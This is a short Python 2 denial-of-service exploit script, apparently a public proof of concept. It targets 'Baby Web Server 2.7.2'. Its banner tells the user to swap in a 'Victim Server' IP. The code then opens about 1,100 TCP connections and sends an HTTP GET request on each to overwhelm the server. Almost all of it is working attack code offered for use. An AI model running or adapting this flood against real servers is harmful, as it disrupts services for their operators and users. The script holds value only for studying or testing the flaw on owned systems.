#!/usr/bin/env python
#Author:Asheesh Kumar Mani Tripathi
#Created:Asheesh Kumar Mani Tripathi
import socket

print "****************************************************"
print "Baby Web Server 2.7.2 Vulnerbility found Denial of Service"
print "Change IP to Victim Server s.connect((127.0.0.1,80))"
print "Author: Asheesh Kumar Mani Tripathi"
print "Reason for DOS attack The Problem lies server" 
print "unable to handle so much of  requests "
print "*****************************************************"

host = "127.0.0.1"
port = 80

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
   conn = s.connect(("127.0.0.1",80))
   for i in range (1,1100):
       request =  "GET /some.txt HTTP/1.1 \n\n"
       connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       connection.connect((host, port))
       connection.send(request)
       print i
except:
   print "Oh! Some Problem Occured Check Server is Running or Not"
